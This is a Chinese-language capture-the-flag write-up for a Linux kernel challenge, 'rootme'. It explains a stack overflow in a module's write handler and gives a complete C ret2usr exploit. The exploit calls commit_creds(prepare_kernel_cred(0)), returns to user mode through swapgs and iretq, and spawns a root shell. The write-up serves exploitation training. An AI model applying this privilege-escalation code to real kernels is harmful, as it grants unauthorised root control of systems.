# HWCTF-Final-rootme && Linux Kernel pwn 

### 0x1 前置补偿

关于Linux Kernel 以及 LKM的前置知识可以参考[这篇](https://mp.weixin.qq.com/s/mx4idyRgfDHQQmbo3RPePg)，还有[这篇](https://m4x.fun/post/linux-kernel-pwn-abc-1/)

#### 关于文件系统：

```shell
# 解压
mkdir core
cd core 
mv ../rootfs.cpio rootfs.cpio.gz
gunzip ./rootfs.cpio.gz
cpio -idmv < rootfs.cpio

## 或者
mkdir core
cd core 
mv ../rootfs.cpio ./
cpio -idmv < rootfs.cpio

# 压缩
gcc exploit.c -static -o exploit
cp exploit core/tmp 
cd core
find . | cpio -o --format=newc > rootfs.cpio
```

#### 关于gdb调试：

```shell
\ -gdb tcp::1234 # 添加到run.sh

#gdb下
target remote :1234
file ./vmlinux	# 加载符号表，像本题中的vmlinux
add-symbolfile rootme.ko textAddr	# 加载驱动，textAddr是指core.ko装载进内核空间后的.text段地址（其实就是装载基址）。可以利用root用户'cat /sys/module/core/sections/.text'查看。
```

还有一些需要注意的地方：

建议单步调试用`si`，`ni`容易执行一些奇怪的步骤。

#### 关于返回用户态`iretq`：

```c
// iretq执行前的需要的堆栈布局
|----------------------|
| RIP                  |<== low mem
|----------------------|
| CS                   |
|----------------------|
| EFLAGS               |
|----------------------|
| RSP                  |
|----------------------|
| SS                   |<== high mem
|----------------------|
```

#### 关于`swapgs`:

> ## Description[ ¶](https://www.felixcloutier.com/x86/swapgs#description)
>
> SWAPGS exchanges the current GS base register value with the value contained in MSR address C0000102H (IA32_KERNEL_GS_BASE). The SWAPGS instruction is a privileged instruction intended for use by system software.
>
> When using SYSCALL to implement system calls, there is no kernel stack at the OS entry point. Neither is there a straightforward method to obtain a pointer to kernel structures from which the kernel stack pointer could be read. Thus, the kernel cannot save general purpose registers or reference memory.
>
> By design, SWAPGS does not require any general purpose registers or memory operands. No registers need to be saved before using the instruction. SWAPGS exchanges the CPL 0 data pointer from the IA32_KERNEL_GS_BASE MSR with the GS base register. The kernel can then use the GS prefix on normal memory references to access kernel data structures. Similarly, when the OS kernel is entered using an interrupt or exception (where the kernel stack is already set up), SWAPGS can be used to quickly get a pointer to the kernel data structures.
>
> The IA32_KERNEL_GS_BASE MSR itself is only accessible using RDMSR/WRMSR instructions. Those instructions are only accessible at privilege level 0. The WRMSR instruction ensures that the IA32_KERNEL_GS_BASE MSR contains a canonical address.

所以，`swapgs` 指令的使用是基于 `syscall`/`sysret` 这种“快速切入系统服务”方案而带来的附加指令，这种方案下包括：

- `syscall` 与 `sysret` 指令：用于从 ring 3 快速切入 ring 0，以及从 ring 0 快速返回到 ring 3

- `swapgs`

  指令：这个指令的产生是由于在 `syscall/sysret` 的配套使用中的两个因素：

  1. 不直接提供 ring 0 的 `RSP` 值，而 `sysenter` 指令则使用 `IA32_SYSENTER_ESP` 寄存器来提供 RSP 值
  2. 也不使用寄存器来保存原 RSP 值（即：原 ring 3 的 RSP 值），而 `sysexit` 指令则使用 `RCX` 寄存器来恢复原 `RSP` 值（即 ring 3 的 `RSP`）。

  而采用一种比较迂回的方案，就是“交换得到”kernel 级别的数据结构，而这个数据结构中提供了 ring 0 的 RSP 值。

- `IA32_KERNEL_GS_BASE` 寄存器：这是一个 `MSR` 寄存器，用来保存 kernel 级别的数据结构指针

- 最后一个是 `IA32_GS_BASE` 寄存器：但这个寄存器并不是因为 `swapgs` 指令而存在的，是由于 x64 体系的设计

`swapgs` 指令目的是通过 `syscall` 切入到 kernel 系统服务后，通过交换 `IA32_KERNEL_GS_BASE` 与 `IA32_GS_BASE` 值，从而得到 kernel 数据结构块。

#### 关于寻找gadget：

另外如果题目没有给 vmlinux，可以通过 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 提取。

#### 关于获取一些函数的地址：

`cat /proc/kallsyms | grep commit_creds`

`cat /proc/kallsyms | grep prepare_kernel_cred`

```shell
/ $ cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8109a620 T prepare_kernel_cred
ffffffff81b72650 R __ksymtab_prepare_kernel_cred
ffffffff81b89b07 r __kstrtab_prepare_kernel_cred
/ $ cat /proc/kallsyms | grep commit_creds
ffffffff8109a250 T commit_creds
ffffffff81b69b00 R __ksymtab_commit_creds
ffffffff81b89b43 r __kstrtab_commit_creds
```

#### 关于[内核保护措施](https://xz.aliyun.com/t/2054#toc-2)

### 0x2 分析

题目的`run.sh`:

```shell
#!/bin/bash
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel /files/bzImage \
    -append 'console=ttyS0 oops=panic panic=1 init=/init nokaslr' \
    -monitor /dev/null \
    -initrd /files/root.cpio
```

什么保护都没开，aslr也没开。

用于启动内核后初始化的`init`文件：

```shell
#!/bin/sh
chown -R root:root .
chmod 777 /tmp/
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console
insmod /rootme.ko
chown root:root /root/flag
chmod 400 /root/flag
chmod 666 /proc/rootme
chmod 700 /root/
setsid cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /sys
poweroff -d 0  -f
```

可以看到需要分析的是`rootme.ko`

```shell
➜  rootme git:(master) ✗ checksec rootme.ko
[*] './rootme/rootme.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
➜  rootme git:(master) ✗ file rootme.ko
rootme.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=5fda727183d58daaf2a3bc252cd6383abcd7c779, with debug_info, not stripped
```

没有PIE、没有CANARY、没有stripped。

从fops（登记我们的驱动程序提供的所有函数）看到我们注册了write函数：

```c
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_374)
00000000                                         ; XREF: .data:fops/r
00000000 owner           dq ?                    ; offset
00000008 llseek          dq ?                    ; offset
00000010 read            dq ?                    ; offset
00000018 write           dq ?                    ; offset
00000020 read_iter       dq ?                    ; offset
00000028 write_iter      dq ?                    ; offset
00000030 iterate         dq ?                    ; offset
00000038 poll            dq ?                    ; offset
00000040 unlocked_ioctl  dq ?                    ; offset
00000048 compat_ioctl    dq ?                    ; offset
00000050 mmap            dq ?                    ; offset
00000058 open            dq ?                    ; offset
00000060 flush           dq ?                    ; offset
00000068 release         dq ?                    ; offset
00000070 fsync           dq ?                    ; offset
00000078 aio_fsync       dq ?                    ; offset
00000080 fasync          dq ?                    ; offset
00000088 lock            dq ?                    ; offset
00000090 sendpage        dq ?                    ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags     dq ?                    ; offset
000000A8 flock           dq ?                    ; offset
000000B0 splice_write    dq ?                    ; offset
000000B8 splice_read     dq ?                    ; offset
000000C0 setlease        dq ?                    ; offset
000000C8 fallocate       dq ?                    ; offset
000000D0 show_fdinfo     dq ?                    ; offset
000000D8 file_operations ends
```

分析`my_write`函数：

```c
ssize_t __fastcall my_write(file *filp, const char *buff, size_t len, loff_t *off)
{
  unsigned int v4; // edx
  unsigned int v5; // er12
  char a[32]; // [rsp+0h] [rbp-38h]

  _fentry__();
  v5 = v4;
  printk("write\n");
  copy_from_user(a, buff, v5);
  return 0LL;
}
```

可以看到是一个简单的栈溢出，`copy_from_user(a, buff, v5);`中的参数都是我们自己控制。

所以ROP的利用思路：

- 通过 ROP 执行 `commit_creds(prepare_kernel_cred(0))`
- 返回用户态，通过 `system("/bin/sh") `等起 shell

### 0x3 EXP

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
//gcc exp.c -o exp --no-pie --static
size_t user_cs, user_ss, user_rflags, user_sp;

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void *)KERNCALL = (void *)0xffffffff8109a620;
void (*commit_creds)(void *) KERNCALL = (void *)0xffffffff8109a250;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
  __asm__("mov %cs, user_cs\n"
          "mov %ss, user_ss\n"
          "mov %rsp, user_sp\n"
          "pushf\n"
          "pop user_rflags\n");
  puts("[*]status has been saved.");
}

void get()
{

  commit_creds(prepare_kernel_cred(0));
  asm(
      "swapgs\n"
      "pushq user_ss\n"
      "pushq user_sp\n"
      "pushq user_rflags\n"
      "pushq user_cs\n"
      "push $shell\n"
      "iretq\n");
}

void shell()
{
  system("/bin/sh");
  printf("getshell!");
}

int main()
{
  save_status();
  int fd = open("/proc/rootme", 2);

  long long buf[0x500];
  for (int i = 0; i <= 10; i++)
  {
    buf[i] = &get;
  }

  write(fd, buf, 0x500);
  return 0;
}
```

### Reference

[linux kernel 爬坑记录](https://s3cunda.github.io/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2018/09/21/linux-kernel-%E7%88%AC%E5%9D%91%E8%AE%B0%E5%BD%95.html)

[Linux Kernel Pwn ABC(Ⅰ)](https://m4x.fun/post/linux-kernel-pwn-abc-1/#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0)

[入门学习linux内核提权](https://xz.aliyun.com/t/2054#toc-2)

[Linux kernel pwn：ROP & ret2usr](https://mp.weixin.qq.com/s/mx4idyRgfDHQQmbo3RPePg)

